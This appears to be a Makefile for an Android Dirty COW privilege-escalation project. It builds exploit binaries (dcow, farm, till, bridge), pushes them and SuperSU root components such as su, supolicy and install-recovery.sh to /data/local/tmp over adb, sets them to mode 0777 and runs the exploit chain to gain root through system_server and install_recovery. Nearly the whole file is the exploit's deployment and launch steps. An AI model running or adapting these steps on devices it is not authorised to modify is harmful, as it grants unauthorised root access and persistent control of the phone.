all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a APP_PLATFORM=android-23

log: 
	adb logcat | grep -a droid_dd_dcow

run5: build
		## we have powerful system_server + install_recovery root commands see the readme
		adb push cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android-5.1.1_r2 /data/local/tmp/toolbox
		adb push applypatch_android-5.11_r2 /data/local/tmp/till
		adb push libs/arm64-v8a/dcow /data/local/tmp/dcow				
		adb shell chmod 0777 /data/local/tmp/dcow
		adb push libs/arm64-v8a/farm /data/local/tmp/farm
		adb push libs/arm64-v8a/till /data/local/tmp/till
		adb push libs/arm64-v8a/bridge /data/local/tmp/bridge
		adb shell chmod 0777 /data/local/tmp/bridge /data/local/tmp/till /data/local/tmp/farm /data/local/tmp/toolbox
		adb shell /data/local/tmp/farm autoremove

run6: build
## su install isn't working with locked bootloaders stil, example only 

		## we have powerful system_server + install_recovery root commands see the readme
		adb push cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_6.01_r1 /data/local/tmp/toolbox
		adb push su/arm64/libsupol.so /data/local/tmp/su/libsupol.so
		adb push su/arm64/su /data/local/tmp/su/su
		adb push su/arm64/suinit /data/local/tmp/su/suinit
		adb push su/arm64/sukernel /data/local/tmp/su/sukernel
		adb push su/arm64/supolicy /data/local/tmp/su/supolicy
		adb shell chmod 0777 /data/local/tmp/su/libsupol.so /data/local/tmp/su/su /data/local/tmp/su/suinit /data/local/tmp/su/sukernel /data/local/tmp/su/supolicy
		adb push su/common/000000deepsleep /data/local/tmp/su/common/000000deepsleep
		adb push su/common/99SuperSUDaemon /data/local/tmp/su/common/99SuperSUDaemon
		adb push su/common/file_contexts_image /data/local/tmp/su/common/file_contexts_image
		adb push su/common/frp_install /data/local/tmp/su/common/frp_install
		adb push su/common/hexpatch /data/local/tmp/su/common/hexpatch
		adb push su/common/init.supersu.rc /data/local/tmp/su/common/init.supersu.rc
		adb push su/common/install-recovery.sh /data/local/tmp/su/common/install-recovery.sh
		adb push su/common/launch_daemonsu.sh /data/local/tmp/su/common/launch_daemonsu.sh
		adb shell chmod 0777 /data/local/tmp/su/common/000000deepsleep /data/local/tmp/su/common/99SuperSUDaemon /data/local/tmp/su/common/file_contexts_image /data/local/tmp/su/common/frp_install
		adb shell chmod 0777 /data/local/tmp/su/common/hexpatch /data/local/tmp/su/common/init.supersu.rc /data/local/tmp/su/common/install-recovery.sh /data/local/tmp/su/common/launch_daemonsu.sh

## su install isn't working with locked bootloaders stil
#		adb push su/common/Superuser.apk /data/local/tmp/su/common/Superuser.apk
#		adb shell chmod 0777 /data/local/tmp/su/common/Superuser.apk
		
		
			
#------------- if you don't need applypatch use till which runs the exploit only, no apply patch
#			   till exits without harm for subsequent calls		
#		uncomment the following line to completely disable applypatch during exploit
#		adb push libs/arm64-v8a/till /data/local/tmp/till
#		BUT make sure to comment out following line containing 'applypatch__android_6.01_r1' using one or more #
		adb push applypatch_android_6.01_r1 /data/local/tmp/till
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push libs/arm64-v8a/dcow /data/local/tmp/dcow				
		adb shell chmod 0777 /data/local/tmp/dcow
		adb push libs/arm64-v8a/farm /data/local/tmp/farm
		adb push libs/arm64-v8a/bridge /data/local/tmp/bridge
		adb shell chmod 0777 /data/local/tmp/bridge /data/local/tmp/till /data/local/tmp/farm /data/local/tmp/toolbox
		adb shell /data/local/tmp/farm autoremove

clean:
	rm -rf libs
	rm -rf obj

